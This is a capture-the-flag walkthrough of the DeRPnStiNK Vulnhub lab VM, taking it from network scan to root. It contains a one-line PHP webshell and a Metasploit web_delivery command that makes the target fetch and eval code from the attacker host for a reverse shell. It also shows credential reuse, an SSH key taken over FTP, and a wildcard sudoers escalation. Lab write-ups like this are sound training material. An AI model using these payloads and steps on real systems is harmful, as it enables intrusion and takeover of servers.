This is a great Web challenge with a lot of twists. I loved it because several techniques are involved to get all the flags. It was a nice occasion to practice my skills and improve my testing methodogy. 
Thanks a lot to @securekomodo for the fun time!

Let's dive into it!

## Step by step walkthrough

### Goal

The goal of this challenge is to get root and find 4 flags.

### Finding the target VM's IP address

Here is how I get the IP address of a challenge VM that has DCHP enabled. First, I take of note my IP address (*i.e.* the  IP of the Kali VM I am using):
```console
# ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.217.4  netmask 255.255.255.0  broadcast 192.168.217.255
        inet6 fe80::a00:27ff:fee5:35c7  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:e5:35:c7  txqueuelen 1000  (Ethernet)
        RX packets 14088  bytes 9478940 (9.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11610  bytes 1622487 (1.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Then I scan the whole network to get the target VM's IP address:
```console
# nmap -sn 192.168.217.1-254

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-08 10:45 CET
Nmap scan report for 192.168.217.1
Host is up (0.00014s latency).
MAC Address: 0A:00:27:00:00:04 (Unknown)
Nmap scan report for 192.168.217.5
Host is up (0.00034s latency).
MAC Address: 08:00:27:F8:E8:CA (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.217.4
Host is up.
Nmap done: 254 IP addresses (4 hosts up) scanned in 2.20 seconds
```

As you can see, I have 3 IP addresses on my Virtualbox Host only network:
- 192.168.217.1: Windows host
- 192.168.217.4: Kali Linux "attack" VM
- **192.168.217.5: _DeRPnStiNK_ VM**

### Port scanning

The target has three open TCP ports:

```console
# nmap -n -A -p- 192.168.217.5

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-08 09:55 CET
Nmap scan report for 192.168.217.5
Host is up (0.00043s latency).

### Reconnaissance phase

#### Manual testing

**HTTP**\\
The first thing to do after discovering an HTTP open port, is to manually browse the application and take note of all interesting functionalities and URLs.

At first sight, the site does not seem to contain much but the source code of the server's root (http://192.168.217.5) reveals the first flag:
**flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)**
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/flag1.PNG" alt="flag1.png">

**FTP**\\
The FTP server is accessible and is vulnerable to user enumeration because we're prompted for a password only when the user supplied is valid (*stinky* in this case):
```console
# ftp 192.168.217.5 21
Connected to 192.168.217.5.
220 (vsFTPd 3.0.2)
Name (192.168.217.5:root): root
530 Permission denied.
Login failed.

# ftp 192.168.217.5 21
Connected to 192.168.217.5
220 (vsFTPd 3.0.2)
Name (192.168.217.5:root): stinky
331 Please specify the password.
Password:
```

**SSH**\\
Password authentication is not allowed for *stinky*. We need his private key to be authenticated on the SSH server.
```console
# ssh stinky@192.168.217.5
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      | 
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)   
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

stinky@192.168.217.5: Permission denied (publickey).
```

#### Automatic scanning

The next step is to scan the application with automatic tools in order to find any other hidden resources.
For that, I usually use:
- <u>Burp spider</u> to find links referenced in the application's source code
- <u>Dirb</u> for file and directory brute-forcing to find links not referenced anywhere

**Burp spider**\\
Spidering the site with Burp Spider reveals two new URLS:
* http://192.168.217.5/webnotes/:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/webnotes.png" alt="webnotes.png">
This is a logged whois request done by the system user *stinky*. This is good to know because we could try to login to FTP or SSH with this username.
* http://derpnstink.local/webnotes/info.txt
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/info.png" alt="info.png">
Interesting! This says that there is a blog (but where?!) on the site and that we should add its domain (which one?!) to /etc/hosts.

**Dirb**\\
The following Dirb command finds a lot of new files and directories:
```console
# dirb http://192.168.217.5 /usr/share/dirb/wordlists/common.txt -o dirb.log
```

{% capture drunk-admin-url %}{{ site.url }}{{ site.baseurl }}{% post_url 2018-03-04-vulnhub-drunk-admin-walkthrough %}{% endcapture %}
As always, let's extract all URLs with a 200 HTTP response code and directories found, then take screenshots with Eyewitness using the following commands:
```console
# cat dirb.log | grep "CODE:200" | cut -d" " -f2 > urls.txt
# cat dirb.log | grep "==> DIRECTORY:" | cut -d" " -f3 >> urls.txt
# eyewitness --headless -f /home/pentesterland/urls.txt 
```
For more details on this process, see the [Vulnhub Drunk admin walkthrough]({{ drunk-admin-url }}.

The most interesting URLs found are http://192.168.217.5/php/phpmyadmin/ and http://192.168.217.5/weblog.
Since we don't have credentials to access phpMyAdmin, let's focus on the second URL. It redirects to http://derpnstink.local/weblog. 

Let's add this domain to our /etc/host file:
```console
echo "192.168.217.5   derpnstink.local" >> /etc/hosts
```

Now we can access /weblog and it is the blog we were looking for!
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/weblog.png" alt="weblog.png">

Again, there isn't much on this blog. But something weird is going on with the slideshow:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/slideshow.png" alt="slideshow.png">
It looks like something tried to upload webshells but they are not accessible.
Only elidumfy.php is but it is not obvious how to use it:
- http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/elidumfy.php?cmd=ls does'nt work
- http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/elidumfy.php?c=ls does'nt work either
- Looking for this filename on Google (in case it's a known webshell) didn't help either.
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/slideshow2.png" alt="slideshow2.png">

**wpscan**\\
*Wappalyzer* indicates that the CMS used is Wordpress. So let's run Wpscan!
```console
# wpscan --url http://192.168.217.5/weblog

...snip...
```

There are several vulnerabilities, particularly an arbitrary file upload affecting the slideshow gallery plugin. This must be exploitable (especially considering the webshells we found) but it requires authentication!

### Exploiting the Slideshow arbitrary file upload vulnerability
#### Accessing the blog admin interface
The login page is <http://derpnstink.local/weblog/wp-login.php>. The password reset functionality is vulnerable to user enumeration. It returns different response whether the user supplied exists or not.
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/wp-user-enum1.png" alt="wp-user-enum1.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/wp-user-enum2.png" alt="wp-user-enum2.png">
This tells us that *admin* is a valid username.
And we're in luck because his password is also *admin* (literally the first one tried works!).

#### Uploading a webshell
Now that we're in the Wordpress admin interface, we can upload a new webshell to the slideshow:
```console
# cat php_basic_webshell.php 
<?php
system($_GET["cmd"]);
?>
```
And access it via <http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/phpbasicwebshell.php?cmd=ls>.

#### Upgrading to a Meterpreter shell

A Meterpreter session is always better than a basic shell.
```console
msf > use multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set TARGET  1
TARGET => 1
msf exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set lhost 192.168.217.4
lhost => 192.168.217.4
msf exploit(multi/script/web_delivery) > set srvport 9876
srvport => 9876
msf exploit(multi/script/web_delivery) > exploit

php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.217.4:9876/VTurVPyjPuT'));"
```

After visiting <http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/phpbasicwebshell.php?cmd=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://192.168.217.4:9876/VTurVPyjPuT%27));%22>, we get a new Meterpreter session on the target:
```console

```

#### Browsing the filesystem as *www-data*
The current user is www-data and has very limited permissions.
```console
meterpreter > shell
Process 2225 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The other users which are allowed to run a shell are *root*, *stinky* and *mrderp*:
```console
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...snip...
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
```
But with the permissions of *www-data*, we cannot access their home folder:

```console
meterpreter > shell
Process 2234 created.
Channel 3 created.
ls /home/stinky
ls: cannot open directory /home/stinky: Permission denied
ls /home
mrderp
stinky
ls /home/stinky
ls: cannot open directory /home/stinky: Permission denied
ls /home/mrderp
ls: cannot open directory /home/mrderp: Permission denied
```

The web server files contain the configuration for accessing the blog's *wordpress* database:
```console
meterpreter > cat /var/www/html/weblog/wp-config.php
<?php
...snip...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```
### Getting root access

#### Pilering information from phpMyAdmin
Let's leverage the credentials found (username *admin* & password *mysql) to access the phpMyAdmin interface found previously:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/phpmyadmin1.png" alt="phpmyadmin1.png">

The *wordpress* database has a table named *wp-users* which lists the blog's users with password hash:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/phpmyadmin2.png" alt="phpmyadmin2.png">
Similary, the *mysql* database has a table named *user* which contain MySQL users and their password hash:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/phpmyadmin3.png" alt="phpmyadmin3.png">

**Playing with the Wordpress hash**\\
*unclesticky*'s wordpress hash, *$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41*, is not easy to break because it is salted. But we can replace it with the hash of a password that we know, let's say _*4ACFE3202A5FF5CF467898FC58AAB1D615029441_ which is the hash of *admin*:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/phpmyadmin4.png" alt="phpmyadmin4.png">
By doing this, we have changed *unclesticky*'s password on the blog. It is now *admin*.

**MySQL hash**\\
MySQL hash, *9B776AFB479B31E8047026F1185E952DD1E530CB*, corresponds to the password _*wedgie57*_.
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/mysql_pwd.png" alt="mysql_pwd.png">

#### Browsing the blog's interface as *unclestinky*

There is a post draft containing the second flag: **flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)**
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/flag2_1.png" alt="flag2_1.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/flag2_2.png" alt="flag2_2.png">

#### Reading Stinky's FTP files
*Stinky* uses the same password on MySQL and FTP:
```console
# ftp 192.168.217.5 21
Connected to 192.168.217.5.
220 (vsFTPd 3.0.2)
Name (192.168.217.5:root): stinky
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 1001     1001         4096 Nov 12 17:23 files
226 Directory send OK.
```

There's an interesting file located at <ftp://192.168.217.5/files/network-logs/derpissues.txt>.
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/derpissues.png" alt="derpissues.png">
If we could find this file, we would obtain Derp's Wordpress credentials since he logged in while capturing his traffic.

The FTP server also serves *stinky*'s private SSH key (Yes!):

#### Getting SSH access as *stinky*
All we have to do is copy the private key found on ftp://192.168.217.5/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/key.txt to ~/.ssh/id_rsa:
```console
chmod 700 ~/.ssh/id_rsa
```
```console
# ssh stinky@192.168.217.5

stinky@DeRPnStiNK:~$ id
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
stinky@DeRPnStiNK:~$ 
```

#### Browsing the filesystem as *stinky*
Here's the third flag:
```console
stinky@DeRPnStiNK:~$ cat Desktop/flag.txt 
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
```
We have also found the pcap file containing Derp's Wordpress credentials:
```console
stinky@DeRPnStiNK:~$ ls Documents/
derpissues.pcap
```
#### Getting Derp's password from the .pcap file
The pcap file can be read with *Wireshark* or *Tcpdump*. It contains Derp's password in clear-text: *derpderpderpderpderpderpderp*
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/derpnstink/derp_pwd.png" alt="derp_pwd.png">

#### Browsing the filesystem as *mrderp*
Now that we have his password, it is easy to switch to the *mrderp* user:
```console
stinky@DeRPnStiNK:~$ su derp
No passwd entry for user 'derp'
stinky@DeRPnStiNK:~$ su mrderp
Password: 
mrderp@DeRPnStiNK:/home/stinky$ 
```

There is only one file in *mrderp*'s home folder. Its contains a conversation with the HelpDesk around an issue he has with the Sudoers file. But the HelpDesk's reply is not complete:
```console
mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log 
Thank you for contacting the Help Desk. Your ticket information and its resolution is
below.
```

#### Becoming *root*
Let's see what the problem is with *sudo su*:
```console
mrderp@DeRPnStiNK:~$ sudo su
[sudo] password for mrderp: 
Sorry, user mrderp is not allowed to execute '/bin/su' as root on DeRPnStiNK.
mrderp@DeRPnStiNK:~$ 
```

So *mrderp* is not allowed to run `/bin/su` with `sudo`! The following command tells us what he is allowed to run whith `sudo`:
```console
mrderp@DeRPnStiNK:~$ sudo -l
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:~$ 
```

That is any file starting with *derpy* and inside */home/mrderp/binaries*! Now, talk about a dangerous practice!
All we have to do is create a binaries folder, and put a script inside it named derpy.sh that start a Bash shell:
```console
mrderp@DeRPnStiNK:~$ cd /home/mrderp/
mrderp@DeRPnStiNK:~$ mkdir binaries
mrderp@DeRPnStiNK:~$ echo "/bin/bash" > binaries/derpy.sh
mrderp@DeRPnStiNK:~$ chmod +x binaries/derpy.sh 
```

Et voilà!
```console
mrderp@DeRPnStiNK:~$ sudo ./binaries/derpy.sh 
root@DeRPnStiNK:~# id
uid=0(root) gid=0(root) groups=0(root)
root@DeRPnStiNK:~# cat /root/

.bashrc               .config/              .dmrc                 .gconf/               .local/               .profile              .xsession-errors

root@DeRPnStiNK:~# cat /root/Desktop/flag.txt
